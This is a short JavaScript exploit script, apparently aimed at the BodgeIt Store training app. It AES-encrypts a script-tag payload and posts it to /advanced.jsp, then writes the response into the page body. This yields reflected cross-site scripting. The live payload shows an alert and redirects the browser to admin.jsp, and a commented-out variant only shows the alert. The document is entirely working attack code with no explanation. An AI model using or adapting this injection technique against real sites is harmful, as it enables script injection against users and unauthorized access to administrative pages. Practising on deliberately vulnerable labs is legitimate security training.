function scriptInject(payload){
  payload = ':' + payload + '';
  console.log(payload);

  encrypted_payload = Aes.Ctr.encrypt(payload, key, 128);
  console.log(encrypted_payload);

  console.log('sending payload...');
  $.post('/advanced.jsp',
  {
    q: encrypted_payload
  },
  function(data, status)
  {
    console.log('status: ' + status);
    console.log('response: ' + data);
    $('body').replaceWith(data);
  });

}
//scriptInject('<script>alert("1337");</script>');
scriptInject('<script>alert("1337");window.location="http://bodgeit.local:8080/admin.jsp"</script>');
